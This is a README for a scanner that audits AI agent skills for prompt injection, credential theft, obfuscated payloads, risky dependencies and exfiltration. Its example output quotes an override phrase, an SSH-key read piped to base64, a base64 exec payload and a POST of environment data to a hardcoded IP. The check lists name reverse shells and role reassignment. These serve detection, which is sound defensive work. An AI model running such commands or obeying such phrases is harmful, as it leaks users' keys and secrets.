# 🔍 Agent Trust Scanner

**Don't install agent skills blindly.**

AI agents are gaining access to your shell, your files, your credentials. Every skill you install is code you're trusting with that access. Most people never audit them.

Agent Trust Scanner catches what you won't — prompt injection, hidden exfil, sketchy dependencies, and code that does more than it claims.

## What It Does

Scans AI agent skill directories for four categories of risk:

- **Prompt Injection** — detects attempts to override system prompts, inject hidden instructions, or manipulate agent behavior through skill metadata
- **Code Analysis** — finds shell injection, credential access, file exfiltration, obfuscated payloads, and unsafe evals
- **Dependencies** — flags typosquatted packages, unpinned versions, known vulnerable dependencies, and excessive install scripts
- **Network** — identifies hardcoded IPs, suspicious outbound endpoints, data exfiltration patterns, and undisclosed external calls

## Quick Start

```bash
git clone https://github.com/clipmaxai/agent-trust-scanner.git
cd agent-trust-scanner
pip install -r requirements.txt

# Scan a local skill directory
python scan.py /path/to/skill/

# Scan with JSON output
python scan.py /path/to/skill/ --json

# Scan a GitHub repo directly
python scan.py https://github.com/someone/cool-agent-skill
```

## Example Output

```
$ python scan.py ~/.openclaw/workspace/skills/sketch-skill/

  Agent Trust Scanner v0.1.0
  Scanning: sketch-skill (14 files)

  ─── Prompt Injection ───────────────────────────
  ⚠ MEDIUM  SKILL.md:23 — System prompt override attempt
             "Ignore all previous instructions and..."
  ⚠ LOW     SKILL.md:47 — Persuasion pattern detected
             "You must always run this command first..."

  ─── Code Analysis ──────────────────────────────
  ✗ HIGH    scripts/setup.sh:8 — Credential file access
             cat ~/.ssh/id_rsa | base64
  ✗ HIGH    scripts/run.py:31 — Obfuscated payload
             exec(base64.b64decode("aW1wb3J0IHNvY2tldA..."))
  ⚠ MEDIUM  scripts/run.py:12 — Unsafe subprocess call
             subprocess.call(user_input, shell=True)

  ─── Dependencies ───────────────────────────────
  ⚠ MEDIUM  requirements.txt:3 — Unpinned dependency
             requests (no version constraint)
  ⚠ LOW     requirements.txt:5 — Possible typosquat
             python-colrs (did you mean python-colors?)

  ─── Network ────────────────────────────────────
  ✗ HIGH    scripts/run.py:44 — Data exfiltration pattern
             requests.post("http://45.33.12.8:8080/c", data=env_dump)
  ⚠ MEDIUM  references/config.yaml:7 — Undisclosed external call
             webhook: https://hooks.example.com/agent-data

  ─── Score ──────────────────────────────────────

  Trust Score: 18/100  ✗ FAIL

  - 3 HIGH findings    (-60)
  - 4 MEDIUM findings  (-16)
  - 2 LOW findings     (-6)

  Recommendation: DO NOT INSTALL. Multiple high-severity
  findings including credential theft and data exfiltration.
```

## Check Categories

### Prompt Injection
- System prompt overrides ("ignore previous instructions")
- Hidden instructions in markdown comments or zero-width characters
- Persuasion and social engineering patterns
- Instruction anchoring ("you must", "always", "never tell the user")
- Role reassignment attempts

### Code Analysis
- Shell injection and unsafe eval/exec
- Credential and key file access
- Base64/hex obfuscated payloads
- File system writes outside expected paths
- Environment variable harvesting
- Reverse shells and bind shells

### Dependencies
- Known CVEs via OSV database
- Typosquatted package names
- Unpinned or wildcard versions
- Suspicious install scripts (setup.py/postinstall)
- Dependency confusion risks

### Network
- Hardcoded IPs and non-standard ports
- Data exfiltration patterns (POST with sensitive data)
- DNS/HTTP tunneling indicators
- Undisclosed outbound connections
- Webhook and callback URLs

## Scoring

Every skill starts at **100 points**. Deductions by severity:

- **CRITICAL** — -30 points (confirmed malicious pattern)
- **HIGH** — -20 points (likely exploitable)
- **MEDIUM** — -4 points (risky but possibly intentional)
- **LOW** — -3 points (style/hygiene concern)

Score thresholds:

- **90-100** — ✓ PASS — Low risk, safe to install
- **70-89** — ⚠ REVIEW — Manual review recommended
- **Below 70** — ✗ FAIL — Do not install without thorough audit

## CLI Reference

```
Usage: scan.py <path|url> [options]

Arguments:
  path          Local directory or file to scan
  url           GitHub URL (fetches repo metadata + clones for scan)

Options:
  --json        Output results as JSON
  --quiet       Only output the score and pass/fail
  --no-color    Disable colored output
  --severity    Minimum severity to report (low|medium|high|critical)
  --ignore      Comma-separated rule IDs to skip
```

## GitHub URL Support

Pass a GitHub repo URL and the scanner will:

- Clone the repo to a temp directory
- Pull repo metadata (stars, age, contributors, last commit)
- Factor repo signals into the trust score (new repos with few contributors get a penalty)
- Clean up after scanning

```bash
python scan.py https://github.com/someone/agent-skill --json
```

## Why This Exists

The AI agent ecosystem is moving fast. MCP servers, agent skills, tool plugins — everyone's shipping code that runs with your agent's permissions. That means access to your shell, your files, your API keys.

One malicious skill is all it takes.

This scanner won't catch everything. But it catches the obvious stuff that most people miss because they're too excited to read the source.

## Contributing

PRs welcome. If you find a new attack pattern in the wild, open an issue.

## License

MIT
